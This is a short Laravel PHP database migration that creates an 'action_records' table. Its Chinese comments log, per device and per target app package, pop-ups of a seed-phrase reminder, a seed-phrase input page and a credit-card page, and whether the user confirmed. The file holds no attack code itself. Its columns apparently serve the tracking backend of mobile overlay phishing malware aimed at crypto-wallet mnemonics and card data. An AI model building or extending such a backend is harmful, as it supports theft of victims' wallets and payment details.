<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('action_records', function (Blueprint $table) {
            $table->id()->comment('主键ID');
            $table->string('device_number', 100)->nullable()->comment('设备号');
            $table->string('app_package', 200)->nullable()->comment('目标（包名）');
            $table->string('action', 50)->nullable()->comment('动作：popup_mnemonic_reminder弹出助记词提醒/popup_mnemonic_input_page弹出输入助记词页面/popup_credit_card_page弹出信用卡页面');
            $table->string('user_action', 50)->nullable()->comment('用户动作：confirm确认/back返回');
            $table->timestamp('popup_time')->nullable()->comment('弹出时间');
            $table->timestamp('operate_time')->nullable()->comment('操作时间');
            $table->timestamps();

            $table->engine = 'InnoDB';
        });
    
        DB::statement("ALTER TABLE `action_records` COMMENT = '动作记录表'");
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('action_records');
    }
};

